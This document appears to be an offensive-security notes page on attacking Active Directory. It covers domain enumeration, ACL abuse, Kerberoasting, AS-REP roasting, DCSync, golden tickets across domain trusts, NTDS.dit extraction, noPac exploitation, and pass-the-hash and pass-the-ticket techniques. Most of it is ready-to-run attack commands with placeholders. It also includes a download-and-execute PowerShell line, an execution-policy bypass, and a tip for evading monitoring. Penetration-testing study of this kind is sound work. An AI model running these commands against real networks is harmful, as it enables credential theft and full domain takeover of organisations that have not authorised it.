+++
title = "Active Directory"
+++

- AD Cheatsheet: https://wadcoms.github.io/
    - Filter by info currently known and by attack type like enumeration, exploitation, etc.
- https://adsecurity.org/

# Authentication Protocol Selection

| Method | Authentication Protocol | Encryption | Limitations |
| :----- | :--------------------- | :--------- | :---------- |
| **IP Address** (e.g., `192.168.1.10`) | **NTLM** | RC4, NTLMv2 | No Kerberos support, may be blocked by policies, more logging/alerting |
| **Hostname/FQDN** (e.g., `DC01.cooldomaininc.local`) | **Kerberos** (TGT/TGS) | AES-128, AES-256, RC4 | Requires DNS resolution, subject to Kerberos delegation restrictions (Double Hop problem) |

# Domain Enumeration

|          | DC Port Cheatsheet |                                                                         |
| -------- | ------------------ | ----------------------------------------------------------------------- |
| Port     | Service            | Role / Why it identifies a DC                                           |
| **53**   | **DNS**            | Almost all DCs run DNS (AD Integrated DNS).                             |
| **88**   | **Kerberos**       | **The Smoking Gun.** Only KDCs (Domain Controllers) listen here.        |
| **389**  | **LDAP**           | Directory Access. Essential for AD.                                     |
| **445**  | **SMB**            | Required for **SYSVOL** (Group Policy) replication.                     |
| **636**  | **LDAPS**          | Secure LDAP (Indicates a Certificate is installed).                     |
| **3268** | **Global Catalog** | **High Fidelity.** Indicates the server has a full index of the Forest. |
| **3269** | **GC SSL**         | Secure Global Catalog.                                                  |

```bash
sudo nmap -n -Pn -p 53,88,389,445,636,3268,3269 --open -oA dc_hunt.txt -v <TARGET>
```

{{< embed-section page="Docs/7 - Lateral Movement/Lateral Movement" header="network-info" >}}

# User Enumeration

"A tool to quickly bruteforce and enumerate valid Active Directory accounts through Kerberos Pre-Authentication"
- https://github.com/ropnop/kerbrute
- Username Lists
    - https://github.com/initstring/linkedin2username
    - https://github.com/insidetrust/statistically-likely-usernames
- PowerShell Tool: https://github.com/dafthack/DomainPasswordSpray

{{< embed-section page="Docs/5 - Exploitation/online-credentials-attacks" header="user-enum" >}}

# AD Enumeration

{{< embed-section page="Docs/9 - Notes/bloodhound" header="bloodhound" >}}

## PowerShell (ADSI searcher)

Uses [System.DirectoryServices] (ADSI/LDAP) so it works from any domain-joined host without the Active Directory RSAT module.

- Ref: https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.directorysearcher

```powershell
# Equivalent to: Get-ADDomain (defaultNamingContext) — RootDSE and default naming context (reuse $defaultNC below)
$root = [ADSI]"LDAP://RootDSE"
$defaultNC = $root.defaultNamingContext.Value

# Equivalent to: Get-ADDomain — Basic domain info
$domain = [ADSI]"LDAP://$defaultNC"
$domain.Name

# Equivalent to: Get-ADUser -Filter {ServicePrincipalName -like "*"} -Properties ServicePrincipalName — Search for Kerberoastable accounts (requires Domain user)
# (request a TGS for a service in an attempt to crack the service's password, which its hash is used to encrypt the TGS)
$searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]"LDAP://$defaultNC")
$searcher.Filter = "(&(objectCategory=user)(servicePrincipalName=*))"
$searcher.PropertiesToLoad.Add("servicePrincipalName") | Out-Null
$searcher.PropertiesToLoad.Add("samAccountName") | Out-Null
$searcher.FindAll()

# Equivalent to: Get-ADTrust — Domain trust relationships (trustedDomain objects under CN=System)
$sysNC = "CN=System," + $defaultNC
$trustSearcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]"LDAP://$sysNC")
$trustSearcher.Filter = "(objectClass=trustedDomain)"
$trustSearcher.PropertiesToLoad.Add("name") | Out-Null
$trustSearcher.FindAll()

# Equivalent to: Get-ADGroup -Filter * — Group enumeration (all group names)
$searcher.Filter = "(objectCategory=group)"
$searcher.PropertiesToLoad.Clear(); $searcher.PropertiesToLoad.Add("samAccountName") | Out-Null
$searcher.FindAll() | ForEach-Object { $_.Properties["samaccountname"][0] }

# Equivalent to: Get-ADGroup -Identity <GROUP_NAME> — Single group by name
$searcher.Filter = "(&(objectCategory=group)(samAccountName=<GROUP_NAME>))"
$searcher.PropertiesToLoad.Add("distinguishedName") | Out-Null
$groupResult = $searcher.FindOne()
$groupDN = $groupResult.Properties["distinguishedname"][0]

# Equivalent to: Get-ADGroupMember -Identity <GROUP_NAME> — Group members (member attribute contains DNs)
$groupEntry = [ADSI]"LDAP://$groupDN"
$groupEntry.Properties["member"].Value
```

## PowerView (deprecated)

- Original: https://github.com/PowerShellMafia/PowerSploit
- Maintained: https://github.com/BC-SECURITY/Empire/blob/main/empire/server/data/module_source/situational_awareness/network/powerview.ps1

Although "dated" code-wise and heavily flagged by Security Products the underlying LDAP queries have not changed, and it is still functional.

```bash
# Enum users
# https://powersploit.readthedocs.io/en/latest/Recon/Get-DomainUser/
Get-DomainUser -Identity <USER> -Domain <DOMAIN> | Select-Object -Property name,samaccountname,description,memberof,whencreated,pwdlastset,lastlogontimestamp,accountexpires,admincount,userprincipalname,serviceprincipalname,useraccountcontrol

# Enum Domain Admins
# https://powersploit.readthedocs.io/en/latest/Recon/Get-DomainGroupMember/
Get-DomainGroupMember -Identity "Domain Admins" -Recurse

# Enum Domain Trusts
Get-DomainTrustMapping

# Test Admin access locally or remotely
# https://powersploit.readthedocs.io/en/latest/Recon/Test-AdminAccess/
Test-AdminAccess -ComputerName <MACHINE>

# Kerberostable accounts
Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName
```

### SharpView

.NET port of PowerView... usually has same functions and syntax. Useful when a host or network has PowerShell hardening.

## Living Off the Land (Native Binaries)

Typically, these log less and not flagged as much as pulling external tools. Especially in offline or segmented environments these can be more useful.

{{< embed-section page="Docs/6 - Post-Exploitation/security-products" header="windows-defender,windows-firewall" >}}

### Initial Survey

#### DOS Version

```bash
# Am I Alone??
quser
qwinsta

# All-in-1 Info Command
systeminfo

# Hostname, Domain, DC, env vars
hostname
echo %USERDOMAIN%
echo %logonserver%
set
# OS Version
ver.exe
# Security Patches (Hotfixes)
wmic qfe get Caption,Description,HotFixID,InstalledOn

# Network Information
ipconfig /all
arp -a
route print
netstat -anob
netsh advfirewall show allprofiles
```

#### WMI Version

- WMIC Cheatsheet: https://gist.github.com/xorrior/67ee741af08cb1fc86511047550cdaf4

```bash
# Basic Host Info
wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /format:List

# Basic Domain Info
wmic ntdomain get Caption,Description,DnsForestName,DomainName,DomainControllerAddress

# Security Patches
wmic qfe get Caption,Description,HotFixID,InstalledOn

# Process List
wmic process list /format:list

# Domain and DC Info
wmic ntdomain list /format:list

# Users on the Domain
wmic useraccount list /format:list

# Local Groups Info
wmic group list /format:list

# System Accounts Info
wmic sysaccount list /format:list
```

#### `net` Version

These could be potentially heavily monitored. Try `net1` instead of `net` will execute the same functions without the potential trigger from the net string.

```bash
# Information about password requirements
net accounts

# Password and lockout policy
net accounts /domain

# Information about domain groups
net group /domain

# List users with domain admin privileges
net group "Domain Admins" /domain

# List of PCs connected to the domain
net group "Domain Computers" /domain

# List PC accounts of domains controllers
net group "Domain Controllers" /domain

# User that belongs to the group
net group <DOMAIN_GROUP> /domain

# List of domain groups
net groups /domain

# All available groups
net localgroup

# List users that belong to the administrators group inside the domain
net localgroup administrators /domain

# Information about a group (admins)
net localgroup Administrators

# Add user to administrators
net localgroup administrators <USER> /add

# Check current shares
net share

# Get information about a user within the domain
net user /domain <USER>

# List all users of the domain
net user /domain

# Information about the current user
net user %username%

# Mount the share locally
net use Z: \\<TARGET>\<SHARE>

# Get a list of computers
net view

# Shares on the domains
net view /all /domain[:<DOMAIN>]

# List shares of a computer
net view \\<TARGET> /ALL

# List of PCs of the domain
net view /domain
```

#### `dsquery` Version

- https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc732952(v=ws.11)
- Wildcard: https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc754232(v=ws.11)
- LDAP OID: https://ldap.com/ldap-oid-reference-guide/
    - https://learn.microsoft.com/en-us/troubleshoot/windows-server/active-directory/useraccountcontrol-manipulate-account-properties

Native tool to find AD objects. Only exists on hosts installed with `Active Directory Domain Services Role` and at `C:\Windows\System32\dsquery.dll`.

```bash
# Query all users or computers
dsquery user
dsquery computer

# Query filter for all users in a Domain
dsquery * "CN=Users,DC=<DOMAIN>,DC=<TOPLEVEL_DOMAIN>"

# Users With Specific Attributes Set (PASSWD_NOTREQD)
# 1.2.840.113556.1.4.803:=32 means PASSWD_NOTREQD must be set
dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))" -attr distinguishedName userAccountControl

# Search DCs in Current Domain
dsquery * -filter "(userAccountControl:1.2.840.113556.1.4.803:=8192)" -limit 5 -attr sAMAccountName

# Search disabled accounts
dsquery * -filter "(&(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=2)(adminCount=1)(description=*))" -limit 5 -attr SAMAccountName description
```

{{< figure src="/images/LDAP-OID-UAC-values.png" caption="User Account Control Bit Values" >}}

#### PowerShell Version

{{< embed-section page="Docs/6 - Post-Exploitation/security-products" header="bypass-execution-policy" >}}

```bash
Get-Module
Get-ExecutionPolicy -List
Set-ExecutionPolicy Bypass -Scope Process
Get-ChildItem Env: | ft Key,Value
Get-Content $env:APPDATA\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt
# Pull any other tools via HTTP
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('<DOWNLOAD_URL>');"
```

## Domain Trusts

```powershell
# Search for trusts (ADSI – no RSAT required)
$root = [ADSI]"LDAP://RootDSE"
$defaultNC = $root.defaultNamingContext.Value
$sysNC = "CN=System," + $defaultNC
$searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]"LDAP://$sysNC")
$searcher.Filter = "(objectClass=trustedDomain)"
$searcher.PropertiesToLoad.Add("name") | Out-Null
$searcher.FindAll()

# Or use PowerView
Import-Module .\PowerView.ps1
Get-DomainTrust
Get-DomainTrustMapping
Get-DomainUser -Domain <DOMAIN> | select SamAccountName

netdom query /domain:<DOMAIN> trust

# Using netdom to query workstations and servers
netdom query /domain:<DOMAIN> workstation
```

{{< embed-section page="Docs/9 - Notes/bloodhound" header="domain-trusts" >}}

### Abusing access between Domain Trusts

- SID History: https://learn.microsoft.com/en-us/windows/win32/adschema/a-sidhistory
- SID Filtering: https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-pac/55fc19f2-55ba-4251-8a6a-103dd7c66280
    - often disabled by default to allow seamless migration
- Well-known SIDs: https://adsecurity.org/?p=1001

This normally occurs when a privileged user is migrated from one domain to another, and there is no SID filtering in place.

The following are required to do this attack via Mimikatz:
- child domain's
    - KRBTGT hash
        - (Linux) or privileged user creds that can access the domain
    - SID
    - FQDN
    - name of a target user (does not need to exist!)
- root domain's
    - SID of the Enterprise Admins group

#### via Windows

```bash
# Obtaining the KRBTGT Account's NT Hash using Mimikatz and Domain SID
.\mimikatz.exe 'lsadump::dcsync /user:<DOMAIN>\krbtgt'

## REMEMBER: above this SID is for the user... but it contains the domain/group portion. Just cut off the number after the last '-' section

Import-Module .\PowerView.ps1
Get-DomainSID

# Obtaining Enterprise Admins Group's SID using Get-DomainGroup
Get-DomainGroup -Domain <DOMAIN> -Identity "Enterprise Admins" | select distinguishedname,objectsid

# BEFORE: Verify no ticket
klist
ls \\<DC_FQDN>\c$

# Create GOLDEN TICKET
# NOTE: the user matters only for logging
.\mimikatz.exe 'kerberos::golden /ptt /user:<USER> /domain:<TARGET_DOMAIN> /sid:<TARGET_DOMAIN_SID> /krbtgt:<KRBTGT_HASH> /sids:<TARGET_SID>'

# AFTER: Verify ticket creation and no access
klist
ls \\<DC_FQDN>\c$

===

# Rubeus method
.\Rubeus.exe golden /rc4:<KRBTGT_HASH> /domain:<TARGET_DOMAIN> /sid:<TARGET_DOMAIN_SID> /sids:<TARGET_SID> /user:<USER> /ptt

# Then DCSYNC attack via Mimikatz
lsadump::dcsync /user:<DOMAIN>\<USER> /domain:<TARGET_DOMAIN>
```

#### via Linux

Individually...

```bash
# Performing DCSync with secretsdump.py
secretsdump.py <DOMAIN>/<USER>:'<PASSWORD>'@<DC_IP> -just-dc-user <TARGET_DOMAIN>/krbtgt

# Domain SID
lookupsid.py <DOMAIN>/<USER>:'<PASSWORD>'@<DC_IP> | grep "Domain SID"

# GOLDEN TICKET attack
ticketer.py -nthash <KRBTGT_HASH> -domain <TARGET_DOMAIN> -domain-sid <TARGET_DOMAIN_SID> -extra-sid <TARGET_SID> <USER>
export KRB5CCNAME="$(pwd)/<USER>.ccache"

# !!! use something like psexec to access !!!
```

...or all-in-one script, but with **GREAT CAUTION and UNDERSTANDING how this could negatively impact the target**

```bash
# NOTE: will prompt for password
raiseChild.py -target-exec <DC_IP> <TARGET_DOMAIN>/<USER>

# can use administrator hash from output to secretsdump.py for a user
```

# Access Control List (ACL)

- ObjectAceType Permissions: https://learn.microsoft.com/en-us/windows/win32/adschema/extended-rights

- `ForceChangePassword` abused with `Set-DomainUserPassword`
- `Add Members` abused with `Add-DomainGroupMember`
- `GenericAll` abused with `Set-DomainUserPassword` or `Add-DomainGroupMember`
- `GenericWrite` abused with `Set-DomainObject`
- `WriteOwner` abused with `Set-DomainObjectOwner`
- `WriteDACL` abused with `Add-DomainObjectACL`
- `AllExtendedRights` abused with `Set-DomainUserPassword` or `Add-DomainGroupMember`
- `AddSelf` abused with `Add-DomainGroupMember`
- `DS-Replication-Get-Changes-All` to perform a [DCSync attack]({{% ref "active-directory.md#dcsync" %}})
- `AddKeyCredentialLink` to get user's NTLM Hash

| ACL                                     | Abuse                                                                    | Impact                             |
| --------------------------------------- | ------------------------------------------------------------------------ | ---------------------------------- |
| `DCSync` (`GetChanges`+`GetChangesAll`) | `lsadump::dcsync` / `secretsdump`                                        | Dump all domain hashes — game over |
| `GenericAll`                            | `Set-DomainUserPassword` / `Add-DomainGroupMember` / RBCD / Shadow Creds | Full control over object           |
| `AllExtendedRights`                     | `Set-DomainUserPassword` / `Add-DomainGroupMember` / DCSync              | Extended rights bundle             |
| `WriteDACL`                             | `Add-DomainObjectACL` → grant self GenericAll                            | Escalates to GenericAll            |
| `WriteOwner`                            | `Set-DomainObjectOwner` → WriteDACL → GenericAll                         | Escalates to GenericAll            |
| `Owns`                                  | `Set-DomainObjectOwner` → WriteDACL chain                                | Same as WriteOwner                 |
| `ReadLAPSPassword`                      | `Get-DomainComputer -Properties ms-mcs-AdmPwd`                           | Instant local admin                |
| `ReadGMSAPassword`                      | `gMSADumper.py`                                                          | Service account takeover           |
| `GenericWrite`                          | `Set-DomainObject` / Targeted Kerberoast / Shadow Creds / Logon script   | Partial control                    |
| `ForceChangePassword`                   | `Set-DomainUserPassword`                                                 | Password reset without old pass    |
| `AddMembers`                            | `Add-DomainGroupMember`                                                  | Add self to privileged group       |
| `AddSelf`                               | `Add-DomainGroupMember`                                                  | Add self to one group only         |

### Top ACL Attacks

- [ForceChangePassword](https://bloodhound.specterops.io/resources/edges/force-change-password#forcechangepassword) - gives us the right to reset a user's password without first knowing their password (should be used cautiously and typically best to consult our client before resetting passwords).
- [GenericWrite](https://bloodhound.specterops.io/resources/edges/generic-write#genericwrite) - gives us the right to write to any non-protected attribute on an object. If we have this access over a user, we could assign them an SPN and perform a Kerberoasting attack (which relies on the target account having a weak password set). Over a group means we could add ourselves or another security principal to a given group. Finally, if we have this access over a computer object, we could perform a resource-based constrained delegation attack which is outside the scope of this module.
- [AddSelf](https://bloodhound.specterops.io/resources/edges/add-self#addself) - shows security groups that a user can add themselves to.
- [GenericAll](https://bloodhound.specterops.io/resources/edges/generic-all#genericall) - this grants us full control over a target object. Again, depending on if this is granted over a user or group, we could modify group membership, force change a password, or perform a targeted Kerberoasting attack. If we have this access over a computer object and the [Local Administrator Password Solution (LAPS)](https://www.microsoft.com/en-us/download/details.aspx?id=46899) is in use in the environment, we can read the LAPS password and gain local admin access to the machine which may aid us in lateral movement or privilege escalation in the domain if we can obtain privileged controls or gain some sort of privileged access.

{{< figure src="/images/ACL_attacks_graphic.png" alt="ACL Attacks" caption="by https://x.com/_nwodtuhs" >}}

### Enumerating ACLs of User

{{< embed-section page="Docs/9 - Notes/bloodhound" header="enumerating-acls-of-user" >}}

#### PowerView

{{< embed-section page="Docs/9 - Notes/powerview" header="acl-enumeration" >}}

#### Manual

**WARNING:** These commands are very slow

```powershell
# Create list of Domain Users (ADSI)
$root = [ADSI]"LDAP://RootDSE"
$defaultNC = $root.defaultNamingContext.Value
$searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]"LDAP://$defaultNC")
$searcher.Filter = "(objectCategory=user)"
$searcher.PropertiesToLoad.Add("samAccountName") | Out-Null
$searcher.FindAll() | ForEach-Object { $_.Properties["samaccountname"][0] } | Set-Content ad_users.txt

# Iterate over users to find filtered ACL (ACL via LDAP path)
foreach($line in [System.IO.File]::ReadLines(".\ad_users.txt")) {
  $u = New-Object System.DirectoryServices.DirectorySearcher([ADSI]"LDAP://$defaultNC")
  $u.Filter = "(&(objectCategory=user)(samAccountName=$line))"
  $u.PropertiesToLoad.Add("distinguishedName") | Out-Null
  $r = $u.FindOne(); if($r) { $dn = $r.Properties["distinguishedname"][0]; Get-Acl "LDAP://$dn" | Select-Object Path -ExpandProperty Access | Where-Object {$_.IdentityReference -match '<DOMAIN>\\<USER>'} }
}

# Manually resolve ACL (ObjectAceType) GUIDs (ADSI)
$root = [ADSI]"LDAP://RootDSE"
$configNC = $root.configurationNamingContext.Value
$extSearcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]"LDAP://CN=Extended-Rights,$configNC")
$extSearcher.Filter = "(objectClass=controlAccessRight)"
$extSearcher.PropertiesToLoad.Add("name") | Out-Null
$extSearcher.PropertiesToLoad.Add("displayName") | Out-Null
$extSearcher.PropertiesToLoad.Add("distinguishedName") | Out-Null
$extSearcher.PropertiesToLoad.Add("rightsGuid") | Out-Null
$extSearcher.FindAll() | Where-Object { $_.Properties["rightsguid"][0] -eq "<GUID>" }
```

## Checking Access Rights

### Remote Desktop

- https://powersploit.readthedocs.io/en/latest/Recon/Get-NetLocalGroupMember/

```powershell
# Check if machine is RDP-able
Import-Module .\PowerView.ps1
Get-NetLocalGroupMember -GroupName "Remote Desktop Users" -ComputerName <COMPUTER_NAME>
```

{{< embed-section page="Docs/9 - Notes/bloodhound" header="canrdp" >}}

### WinRM

```powershell
# Check if machine is WinRM-able
Import-Module .\PowerView.ps1
Get-NetLocalGroupMember -GroupName "Remote Management Users" -ComputerName <COMPUTER_NAME>
```

{{< embed-section page="Docs/9 - Notes/bloodhound" header="canpsremote" >}}

### SQL

```powershell
# Enumerate MSSQL instances on the domain
Import-Module .\PowerUpSQL.ps1
Get-SQLInstanceDomain

Get-SQLQuery -Verbose -Instance "<TARGET>,1433" -username "<DOMAIN>\<USER>" -password "<PASSWORD>" -query 'Select @@version'
```

```bash
impacket-mssqlclient -windows-auth <DOMAIN>/<USER>:'<PASSWORD>'@<TARGET>
```

{{< embed-section page="Docs/9 - Notes/bloodhound" header="sqladmin" >}}

## Domain Misconfigurations

### DNS Record Enumeration (adidnsdump)

Resolves hidden records in the DNS zone that standard enumeration misses.

```bash
# Dump all DNS records (Authenticated)
adidnsdump -vr -u <DOMAIN>\<USER> -p <PASSWORD> ldap://<DC_IP>

# Resolve unknown records (A Query)
adidnsdump -u <DOMAIN>\<USER> -p <PASSWORD> ldap://<DC_IP> -r
```

### User Attributes Mining

Hunting for passwords in descriptions and weak account configurations.

{{< embed-section page="Docs/9 - Notes/powerview" header="user-attributes-mining" >}}

### SYSVOL & Group Policy Passwords

Searching for hardcoded credentials in scripts and registry preferences.

```bash
# 1. Manual Check (PowerShell)
ls \\<DC_NAME>\SYSVOL\<DOMAIN>\scripts

# 2. Automated Hunt (NetExec) - GPP Autologin & Registry
nxc smb <TARGET_IP> -u <USER> -p <PASSWORD> -M gpp_autologin
nxc smb <TARGET_IP> -u <USER> -p <PASSWORD> -M gpp_password
```

### Printer Bug Enumeration (Spooler Service)

Checks if the Print Spooler is running on the DC (required for coercion attacks like PetitPotam/PrinterBug).

```powershell
# SecurityAssessment.ps1
git clone https://github.com/itzvenom/Security-Assessment-PS && cd Security-Assessment-PS
Import-Module .\SecurityAssessment.ps1
Get-SpoolStatus -ComputerName <DC_FQDN>
```

### Exchange Privilege Escalation

Abusing Exchange Windows Permissions group.

Reference: https://github.com/gdedrouas/Exchange-AD-Privesc

# Getting Access Credentials

## Kerberoasting (cracking TGS)

- Service Principal Names (SPN): https://learn.microsoft.com/en-us/windows/win32/ad/service-principal-names
- Event 4769 Logging: https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4769
- Event 4770 Logging: https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4770
- Mitigation: https://adsecurity.org/?p=3458

Kerberoasting involves any valid domain user requesting a Ticket Granting Service (TGS) for an SPN. The TGS is encrypted with the service's NTLM password hash, which if a human-readable password was set, can be cracked to reveal a password. The service is often times a local administrator. The key point is this technique **must use password cracking to reveal the password; otherwise, only the TGS and an authorized user can access the service** . Hence, an uncrackable password will prove fruitless.
One must have 1 of the following:
- an account's cleartext password or NTLM hash
- a shell in the context of a domain user account (Kerberos ticket)
- SYSTEM level access on a domain-joined host

### TGS Encryption Types

- Kerberos Encryption Types: https://techcommunity.microsoft.com/blog/coreinfrastructureandsecurityblog/decrypting-the-selection-of-supported-kerberos-encryption-types/1628797

| Encryption Type | Hashcat Mode | Hash Format     | Notes                                                       |
| :-------------- | :----------- | :-------------- | :---------------------------------------------------------- |
| **RC4**         | `13100`      | `$krb5tgs$23$*` | Most common in most environments. Type 23 encrypted ticket. |
| **AES-128**     | `19600`      | `$krb5tgs$17$*` | Type 17 encrypted ticket.                                   |
| **AES-256**     | `19700`      | `$krb5tgs$18$*` | Sometimes received. Type 18 encrypted ticket.               |

#### Create Fake SPN via PowerView

Create a fake SPN to Kerberoast a user. This will require proper enumeration and a vector to have the right privileges.

`SPN_NAME` format: `serviceclass/host[:port]`: e.g. `MSSQLSvc/sql01.domain.local:1433`

**First import PowerView:**

{{< embed-section page="Docs/6 - Post-Exploitation/nice-commands" header="via-powerview" >}}

```powershell
# Authenticate
$SecPassword = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
$CredSPN = New-Object System.Management.Automation.PSCredential('<DOMAIN>\<USER>', $SecPassword)

# Create SPN
Set-DomainObject -Credential $CredSPN -Identity <USER> -SET @{serviceprincipalname='<SPN_NAME>'} -Verbose
```

##### Cleanup

```powershell
# Remove fake SPN
Set-DomainObject -Credential $CredSPN -Identity <USER> -Clear <SPN_NAME> -Verbose
```

## Linux

### Impacket GetUserSPNs

```bash
# Enum users and collect tickets
impacket-GetUserSPNs -dc-ip <DC_IP> <DOMAIN>/<USER> -request -outputfile spn_tickets.txt
```

### Crack TGS

```bash
# Crack TGS
hashcat -m <HASHCAT_MODE> spn_tickets.txt <WORDLIST>

# Verify via netexec
netexec smb <DC_IP> -u <USER> -p <PASSWORD>
```

## Windows

- https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc731241(v=ws.11)

#### via Rubeus

```bash
# Show Kerberoastable users
.\Rubeus.exe kerberoast /nowrap

# Show Kerberoastable admins
.\Rubeus.exe kerberoast /nowrap /ldapfilter:'admincount=1'

# Kerberoast User
# NOTE: /tgtdeleg attempts to force RC4 enc
.\Rubeus.exe kerberoast /nowrap /tgtdeleg /user:<USER>
```

**NOTE:** This RC4 downgrade does not work against a Windows Server 2019 Domain Controller. It will always return a service ticket encrypted with the highest level of encryption supported by the target account. `/tgtdeleg` is a client-side negotiation hint only — it cannot override DC or account policy. The SPN account's `msDS-SupportedEncryptionTypes` attribute must include RC4 (flag value `0x4`) for the DC to issue an RC4-encrypted ticket; if the account or domain policy excludes RC4, the DC will issue AES regardless of what the client requests.#### via PowerView

```bash
# Enumerate SPN Accounts
Import-Module .\PowerView.ps1
Get-DomainUser * -spn | select samaccountname,description
```

```bash
# Get TGS for User
Get-DomainUser -Identity <USER> | Get-DomainSPNTicket -Format Hashcat
```

```bash
# Get ALL TGS
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv -NoTypeInformation .\<OUTFILE>
```

#### via Manual Method

```bash
# REQUIRED: declare new type
Add-Type -AssemblyName System.IdentityModel

# Request and load all TGS for all SPNs into memory
# NOTE: these will need to be dumped from memory
setspn.exe -T <DOMAIN> -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }

# Dump TGS from memory
.\mimikatz.exe
base64 /out:true
kerberos::list /export

# Format Base64 TGS
echo '<TGS_BASE64>' | tr -d \\n | base64 -d > vmware.kirbi
kirbi2john vmware.kirbi > crackme.txt

# CRACK!
```

**See cracking:** [Crack TGS](#crack-tgs)

## AS-REP Roasting

When Kerberos pre-authentication is disabled, an attacker can request encrypted authentication responses without needing the user's password and later attempt offline password cracking.

### Windows

```powershell
# Enumerate Vulnerable Users (PowerView)
Import-Module .\PowerView.ps1
Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl

# Roast Specific User (Rubeus)
.\Rubeus.exe asreproast /nowrap /format:hashcat /user:<USERNAME>
```

### Linux

```bash
# Linux Alternative (Kerbrute)
# Brute-force users AND auto-check for AS-REP Roasting
kerbrute userenum -d <DOMAIN> --dc <DC_IP> <USERLIST>
```

## DCSync

- https://www.thehacker.recipes/ad/movement/credentials/dumping/dcsync
- https://tools.thehacker.recipes/mimikatz/modules/lsadump/dcsync

Steals the Active Directory password database by using the built-in `Directory Replication Service Remote Protocol`, which is used by Domain Controllers to replicate domain data, allowing an attacker to mimic a DC to retrieve user NTLM password hashes.

- REQUIRES: `DS-Replication-Get-Changes` or `DS-Replication-Get-Changes-All` Permission
    - or `Write-Dacl` to add perm: https://bloodhound.specterops.io/resources/edges/write-dacl

### Enum via PowerView

```powershell
# Look for DS-Replication-Get-Changes-All
$sid = Convert-NameToSid <USER>
Get-ObjectAcl "DC=<DOMAIN>,DC=<TOPLEVEL_DOMAIN>" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} | select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl
```

### Attack via netexec

{{< embed-section page="Docs/9 - Notes/netexec" header="ntds-extraction" >}}

### Attack via mimikatz

{{< embed-section page="Docs/9 - Notes/mimikatz" header="dcsync" >}}

### Manually via `NTDS.dit`

`netexec` essentially does the same thing here but remotely... so this should be a last resort method.

```bash
# Copy NTDS.dit
# NOTE: hashes in NTDS are encrypted with DPAPI key in SYSTEM
vssadmin list shadows
vssadmin CREATE SHADOW /For=C:
cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy<NUM>\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit

# Download it and impacket-secretsdump
impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL
```

```bash
# Same as above but easier
netexec smb <TARGET> -u <ADMIN_USER> -p <PASSWORD> -M ntdsutil
```

## NoPac (SAMAccountName Spoofing)

CVE-2021-42278 / CVE-2021-42287. Any domain user can create machine accounts (up to `ms-DS-MachineAccountQuota`, default 10). This attack renames a machine account to match a DC's SAMAccountName, requests a TGT, then renames it back -- the KDC issues a service ticket with DC privileges. Result: SYSTEM shell or full DCSync as a regular user.

**Check vulnerability with `netexec`**
```bash
nxc smb <T> -M nopac
```

- https://github.com/Ridter/noPac

```bash
# Clone tool
git clone https://github.com/Ridter/noPac.git && cd noPac

# Check if domain is vulnerable (MachineAccountQuota > 0 = vulnerable)
sudo python3 scanner.py <DOMAIN>/<USER>:<PASS> -dc-ip <DC_IP> -use-ldap

# Get semi-interactive SYSTEM shell
sudo python3 noPac.py <DOMAIN>/<USER>:<PASS> -dc-ip <DC_IP> -dc-host <DC_HOSTNAME> -shell --impersonate administrator -use-ldap

# DCSync to dump administrator hash
sudo python3 noPac.py <DOMAIN>/<USER>:<PASS> -dc-ip <DC_IP> -dc-host <DC_HOSTNAME> --impersonate administrator -use-ldap -dump -just-dc-user <DOMAIN>/administrator
```

# Escalating and Pivoting

## Pass the Key (PtK) / OverPass the Hash (OtH)

*Concept: Request a Kerberos Ticket (TGT) using an NTLM hash or AES Key, rather than using the NTLM protocol directly.*

### Preparation

```bash
# Extract AES Keys
.\mimikatz.exe "privilege::debug" "sekurlsa::ekeys" exit
```

### Option A: Mimikatz (Process Injection)

```bash
# Spawns a process. Windows will implicitly request TGT using the injected key/hash when network resources are accessed.
# Can use /ntlm, /aes128, or /aes256
sekurlsa::pth /domain:<DOMAIN> /user:<USER> /aes256:<AES256_KEY> /run:cmd.exe
```

### Option B: Rubeus (Request & Inject)

```bash
# Requests a TGT from the KDC and immediately injects it (/ptt)
# Can use /rc4 (NTLM), /aes128, or /aes256
.\Rubeus.exe asktgt /ptt /domain:<DOMAIN> /user:<USER> /aes256:<AES256_KEY>
```

## Pass the Ticket (PtT)

### Windows

**Mimikatz**
```bash
# 1. Export tickets from memory to .kirbi files
.\mimikatz.exe "privilege::debug" "sekurlsa::tickets /export" exit
# $ : machine tickets (computers)
# @ : service tickets (users)

# 2. Inject Ticket
.\mimikatz.exe "kerberos::ptt <TICKET_FILE.kirbi>" "misc::cmd" exit
```

**Rubeus**
```bash
# Enumerate tickets currently in session
.\Rubeus.exe triage

# Export tickets to base64 (for copy-paste)
.\Rubeus.exe dump /nowrap

# Pass from File
.\Rubeus.exe ptt /ticket:"<TICKET_FILE.kirbi>"

# Pass from Base64 String
.\Rubeus.exe ptt /ticket:"<BASE64_STRING>"

